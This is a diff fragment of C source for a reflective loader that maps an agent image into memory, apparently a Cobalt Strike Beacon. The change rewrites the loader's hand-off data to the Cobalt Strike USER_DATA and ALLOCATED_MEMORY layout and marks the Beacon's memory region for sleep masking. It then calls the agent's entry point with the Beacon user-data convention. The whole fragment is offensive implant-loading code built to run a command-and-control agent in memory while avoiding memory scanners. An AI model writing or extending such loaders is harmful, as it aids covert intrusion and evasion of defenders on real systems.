@@ -243,35 +243,39 @@ FUNC VOID Main(
 
     Instance()->Win32.NtFlushInstructionCache( (HANDLE)-1, MappedBase, ImageSize );
 
-    /* ── Populate UDRL_USER_DATA ── */
+    /* ── Populate CS USER_DATA + ALLOCATED_MEMORY ── */
 
-    UDRL_USER_DATA *Ud = Instance()->Win32.VirtualAlloc(
-        NULL, sizeof(UDRL_USER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    SIZE_T udSize = sizeof(USER_DATA) + sizeof(ALLOCATED_MEMORY);
+    PBYTE UdBuf = Instance()->Win32.VirtualAlloc(
+        NULL, udSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
-    if ( Ud ) {
-        MmZero( Ud, sizeof(UDRL_USER_DATA) );
-        Ud->magic     = UDRL_MAGIC;
-        Ud->load_type = LOAD_TYPE_VIRTUAL_ALLOC;
+    if ( UdBuf ) {
+        MmZero( UdBuf, udSize );
 
-        Ud->agent_base  = MappedBase;
-        Ud->agent_size  = ImageSize;
-        Ud->loader_base = Instance()->Base.Buffer;
-        Ud->loader_size = Instance()->Base.Length;
+        USER_DATA *Ud             = (USER_DATA *)UdBuf;
+        ALLOCATED_MEMORY *AllocMem = (ALLOCATED_MEMORY *)(UdBuf + sizeof(USER_DATA));
 
-        Ud->regions[0].base    = MappedBase;
-        Ud->regions[0].size    = ImageSize;
-        Ud->regions[0].protect = PAGE_EXECUTE_READ;
-        Ud->region_count = 1;
+        Ud->version         = STARBURST_VERSION;
+        Ud->allocatedMemory = AllocMem;
 
-        GenerateRc4Key( Ud->rc4_key );
-    }
+        /* Region 0: Beacon memory (agent image) */
+        AllocMem->AllocatedMemoryRegions[0].Purpose       = PURPOSE_BEACON_MEMORY;
+        AllocMem->AllocatedMemoryRegions[0].AllocationBase = MappedBase;
+        AllocMem->AllocatedMemoryRegions[0].RegionSize     = ImageSize;
 
-    /* ── Call DllMain ── */
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].Label          = LABEL_TEXT;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].BaseAddress    = MappedBase;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].VirtualSize    = ImageSize;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_EXECUTE_READ;
+        AllocMem->AllocatedMemoryRegions[0].Sections[0].MaskSection    = TRUE;
 
-    typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );
+        /* Transfer execution via CS DLL_BEACON_USER_DATA convention */
+        typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );
 
-    if ( EntryRva ) {
-        fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
-        pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, (LPVOID)Ud );
+        if ( EntryRva ) {
+            fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
+            pDllMain( (HINSTANCE)MappedBase, DLL_BEACON_USER_DATA, (LPVOID)Ud );
+            pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, NULL );
+        }
     }
 }
